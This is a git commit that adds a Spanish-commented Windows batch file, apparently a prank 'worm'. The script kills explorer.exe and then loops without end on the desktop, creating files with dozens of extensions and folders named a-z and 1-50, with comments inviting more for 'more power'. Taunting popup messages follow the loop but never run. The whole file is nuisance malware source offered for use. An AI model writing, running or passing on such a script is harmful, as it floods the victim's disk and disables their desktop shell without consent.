58df8202e303403993f373d409fd34f3767f6bfe
WIF003 <98164269+WIF003@users.noreply.github.com>
2022-08-05 22:12:01 -0500

    Create RSW.bat

---
+++ RSW.bat
@@ -0,0 +1,149 @@
+@echo off
+::configuraciones de la ventana
+mode 110,45 
+TASKKILL /F /IM explorer.exe
+title jsjsjsjs
+:: ubicación del archivo 
+cd desktop
+:bucle
+::archivos con los que se crearán
+::(pueden agregarse más extensiones)
+::agregar más para mayor potencia
+set /a worm = %worm% + 1       
+echo HOLA>>%worm%.txt
+echo HOLA>>%worm%.jpg
+echo HOLA>>%worm%.gif
+echo HOLA>>%worm%.png
+echo HOLA>>%worm%.avi
+echo HOLA>>%worm%.odt
+echo HOLA>>%worm%.psd
+echo HOLA>>%worm%.ico
+echo HOLA>>%worm%.net
+echo HOLA>>%worm%.xlx
+echo HOLA>>%worm%.docx
+echo HOLA>>%worm%.xlxs
+echo HOLA>>%worm%.tar
+echo HOLA>>%worm%.rar
+echo HOLA>>%worm%.bmp
+echo HOLA>>%worm%.flv
+echo HOLA>>%worm%.dll
+echo HOLA>>%worm%.pdf
+echo HOLA>>%worm%.doc
+echo HOLA>>%worm%.bat
+echo HOLA>>%worm%.cpp
+echo HOLA>>%worm%.jar
+echo HOLA>>%worm%.html
+echo HOLA>>%worm%.htm
+echo HOLA>>%worm%.php
+echo HOLA>>%worm%.css
+echo HOLA>>%worm%.py
+echo HOLA>>%worm%.sh
+echo HOLA>>%worm%.vbs
+echo HOLA>>%worm%.zip
+echo HOLA>>%worm%.xps
+echo HOLA>>%worm%.xltx
+echo HOLA>>%worm%.xltm
+echo HOLA>>%worm%.xla
+echo HOLA>>%worm%.wpd
+echo HOLA>>%worm%.wmz
+echo HOLA>>%worm%.wmd
+echo HOLA>>%worm%.wmv
+echo HOLA>>%worm%.wma
+echo HOLA>>%worm%.vst
+echo HOLA>>%worm%.exe
+echo HOLA>>%worm%.iso
+echo HOLA>>%worm%.dif
+echo HOLA>>%worm%.bin 
+echo HOLA>>%worm%.apk
+::carpetas a crear
+::Sin límite de creación
+mkdir lol
+mkdir a
+mkdir b
+mkdir c
+mkdir d 
+mkdir e
+mkdir f
+mkdir g 
+mkdir h 
+mkdir i
+mkdir k 
+mkdir l 
+mkdir m
+mkdir n
+mkdir o
+mkdir p
+mkdir q
+mkdir r
+mkdir s
+mkdir t
+mkdir u
+mkdir v 
+mkdir w
+mkdir x
+mkdir y 
+mkdir z
+mkdir 1
+mkdir 2
+mkdir 3
+mkdir 4
+mkdir 5
+mkdir 6
+mkdir 7
+mkdir 8
+mkdir 9
+mkdir 10
+mkdir 11
+mkdir 12 
+mkdir 13 
+mkdir 14
+mkdir 15 
+mkdir 16
+mkdir 17
+mkdir 18 
+mkdir 19
+mkdir 20
+mkdir 21
+mkdir 22
+mkdir 23
+mkdir 24
+mkdir 25
+mkdir 26
+mkdir 27
+mkdir 28
+mkdir 29
+mkdir 30
+mkdir 31
+mkdir 32 
+mkdir 33
+mkdir 34
+mkdir 35
+mkdir 36 
+mkdir 37
+mkdir 38
+mkdir 39 
+mkdir 40
+mkdir 41
+mkdir 42
+mkdir 43
+mkdir 44
+mkdir 45
+mkdir 46
+mkdir 47
+mkdir 48
+mkdir 49
+mkdir 50
+goto bucle
+::No se que poner pero ponle algo
+msg * holaaaaaaaaaaaaaa
+msg * jajajajajaja
+msg * que?
+msg * quieres salir?
+msg * bueno, solo te queda suplicar
+msg * jajajjajajsjajsjajdjjasjjj
+start https://elgoog.im/t-rex/
+msg * juega algo para desestresarte
+dir
+timeout /t 240 /nobreak >nul
+start explorer.exe
+exit
